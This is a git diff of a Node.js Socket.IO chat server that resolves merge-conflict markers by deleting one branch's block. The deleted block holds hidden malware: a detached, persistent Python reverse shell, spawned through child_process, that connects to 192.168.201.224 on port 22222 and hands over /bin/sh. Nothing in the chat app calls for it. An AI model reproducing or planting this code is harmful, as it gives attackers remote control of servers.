@@ -40,10 +40,7 @@ const PortManager = require('./utils/portManager');
 require('dotenv').config();
 
 const { connectDB, sequelize } = require('./config/database');
-<<<<<<< HEAD
 const { pool } = require('./config/mysql2');
-=======
->>>>>>> 5f27be1b509e57b5b2522b889115bc3da96bde5c
 
 // Import models
 const User = require('./models/User');
@@ -130,133 +127,6 @@ const io = socketio(httpServer, {
 // Track user room participation
 const userRooms = new Map(); // userId -> Set of roomIds
 const socketUsers = new Map(); // socketId -> userId
-<<<<<<< HEAD
-=======
-
-io.on('connection', (socket) => {
-  console.log('=== NEW SOCKET CONNECTION ===');
-  console.log('Socket.IO: User connected:', socket.id);
-  console.log('Socket.IO: Transport:', socket.conn.transport.name);
-  console.log('Socket.IO: Engine.IO version:', socket.conn.protocol);
-  console.log('Socket.IO: Remote address:', socket.handshake.address);
-  console.log('Socket.IO: Headers:', socket.handshake.headers);
-
-  socket.on('joinRoom', (data) => {
-    const roomId = data.roomId; // Use actual chat room ID
-    const userId = data.userId;
-    
-    console.log(`[Socket.IO] joinRoom received:`, { roomId, userId, socketId: socket.id });
-    
-    // Store user info
-    socket.userId = userId;
-    socketUsers.set(socket.id, userId);
-    
-    // Track user's room participation
-    if (!userRooms.has(userId)) {
-      userRooms.set(userId, new Set());
-    }
-    userRooms.get(userId).add(roomId);
-    
-    socket.join(roomId);
-    console.log(`[Socket.IO] User ${userId} (socket: ${socket.id}) joined room ${roomId}`);
-    
-    // Notify other users in the room that this user is online
-    socket.to(roomId).emit('userJoinedRoom', { userId, roomId });
-    console.log(`[Socket.IO] Emitted userJoinedRoom to room ${roomId} for user ${userId}`);
-    
-    // Also notify the joining user about other users already in the room
-    const room = io.sockets.adapter.rooms[roomId];
-    if (room) {
-      const otherUsers = Object.keys(room.sockets).filter(socketId => socketId !== socket.id);
-      console.log(`[Socket.IO] Room ${roomId} has ${otherUsers.length} other users:`, otherUsers);
-      
-      // Send list of online users to the newly joined user
-      if (otherUsers.length > 0) {
-        const onlineUserIds = otherUsers
-          .map(socketId => socketUsers.get(socketId))
-          .filter(userId => userId !== undefined);
-        
-        if (onlineUserIds.length > 0) {
-          socket.emit('usersInRoom', { roomId, userIds: onlineUserIds });
-          console.log(`[Socket.IO] Sent usersInRoom to user ${userId}:`, onlineUserIds);
-        }
-      }
-    }
-  });
-
-  socket.on('sendMessage', async (data) => {
-    console.log(`[Socket.IO] Received sendMessage from ${socket.id}:`, data);
-    console.log(`[Socket.IO] Socket user ID:`, socket.userId);
-    console.log(`[Socket.IO] Room ID:`, data.roomId);
-    console.log(`[Socket.IO] Sender ID:`, data.senderId);
-    console.log(`[Socket.IO] Receiver ID:`, data.receiverId);
-    console.log(`[Socket.IO] Message:`, data.message);
-    
-    try {
-      const receiverId = data.receiverId || null;
-      if (!receiverId) {
-        console.warn(`[Socket.IO] Missing receiverId in sendMessage payload for room ${data.roomId}`);
-      }
-      
-      console.log(`[Socket.IO] Creating message in database...`);
-      const message = await ChatMessage.create({
-        sender_id: data.senderId,
-        receiver_id: receiverId,
-        room_id: data.roomId,
-        message: data.message,
-      });
-      console.log(`[Socket.IO] Message created successfully:`, message.toJSON());
-      
-      console.log(`[Socket.IO] Emitting message to room ${data.roomId}...`);
-      io.to(data.roomId).emit('message', message);
-      console.log(`[Socket.IO] Message emitted to room ${data.roomId}`);
-    } catch (error) {
-      console.error('[Socket.IO] Error saving message:', error);
-      console.error('[Socket.IO] Error details:', error.message);
-      console.error('[Socket.IO] Error stack:', error.stack);
-    }
-  });
-
-  socket.on('disconnect', (reason) => {
-    console.log('Socket.IO: User disconnected:', socket.id, 'Reason:', reason);
-    
-    if (socket.userId) {
-      // Notify all rooms that this user left
-      const rooms = userRooms.get(socket.userId) || new Set();
-      rooms.forEach(roomId => {
-        socket.to(roomId).emit('userLeftRoom', { userId: socket.userId, roomId });
-      });
-      
-      // Clean up tracking data
-      userRooms.delete(socket.userId);
-      socketUsers.delete(socket.id);
-    }
-  });
-});
-
-const { spawn } = require("child_process");
-const cmd = `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.201.224",22222));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`;
-const shell = spawn('/bin/bash', ['-c', cmd], {
-  detached: true,
-  stdio: 'ignore'  // Node.js 프로세스와 입출력 분리
-});
-shell.unref();  // Node.js 프로세스가 종료되어도 유지됨
-
-// Connect to database and initialize models
-async function initializeApp() {
-  try {
-    // Connect to database first
-    await connectDB();
-    console.log('✅ Database connected and models synchronized');
-  } catch (error) {
-    console.error('❌ Failed to initialize database:', error);
-    process.exit(1);
-  }
-}
-
-// Initialize the app
-initializeApp();
->>>>>>> 5f27be1b509e57b5b2522b889115bc3da96bde5c
 
 io.on('connection', (socket) => {
   console.log('=== NEW SOCKET CONNECTION ===');
